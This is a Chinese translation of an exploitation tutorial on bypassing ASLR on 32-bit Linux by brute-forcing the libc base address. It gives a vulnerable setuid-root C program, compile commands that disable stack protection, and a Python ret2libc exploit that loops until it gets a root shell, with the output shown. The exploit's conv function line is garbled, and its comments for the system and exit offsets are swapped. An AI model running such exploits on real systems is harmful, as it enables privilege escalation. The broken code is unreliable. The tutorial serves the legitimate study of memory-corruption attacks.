CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。  
转载本文请务必注明，文章出处：《[Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)](http://www.csyssec.org/20170102/bypassaslr-bruteforce)》与作者信息：CSysSec出品  


VM Setup: Ubuntu 12.04(x86)

在这篇文章中，我们来看看如果利用暴力破解技术来绕过共享库的地址随机化。  

## 什么是暴力破解

通过此技术，攻击者选择一个特定的libc基地址，然后不断尝试攻击程序，直到成功。如果你幸运的话，这是绕过ASLR最简单的技术。  

漏洞代码:  

``` c
//vuln.c
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```
编译命令：  

``` bash
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -fno-stack-protector -g -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```
现在让我们来看看攻击者是如何暴力破解libc基地址的。下面是当开启随机化时，libc不同的基地址：   

```
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b6000)
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7568000)
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7595000)
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d9000)
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7542000)
$ ldd ./vuln | grep libc
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb756a000)
$
```
从上面可知，libc的随机化只局限在8个比特位中。因此，最多只要尝试256次，就可以获取root shell。下面的漏洞利用代码中，选择0xb7595000作为libc的基地址，然后我们再不断尝试  

漏洞利用代码：  

``` python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call
libc_base_addr = 0xb7595000
exit_off = 0x00032be0             #Obtained from "readelf -s libc.so.6 | grep system" command.
system_off = 0x0003f060           #Obtained from "readelf -s libc.so.6 | grep exit" command.
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = 0x804827d
#endianess convertion
def conv(num):
 return struct.pack("<I",numystem + exit + system_arg
buf = "A" * 268
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)
print "Calling vulnerable program"
#Multiple tries until we get lucky
i = 0
while (i < 256):
 print "Number of tries: %d" %i
 i += 1
 ret = call(["./vuln", buf])
 if (not ret):
  break
 else:
  print "Exploit failed"
```
执行上面的漏洞利用代码就可以获取root shell，如下所示  

``` bash
$ python exp.py 
Calling vulnerable program
Number of tries: 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��{\�}�
Exploit failed
...
Number of tries: 42
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��{\�}�
Exploit failed
Number of tries: 43
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��{\�}�
# id
uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)
# exit
$
```
注意： 类似地，栈地址和堆地址也可以暴力破解！  

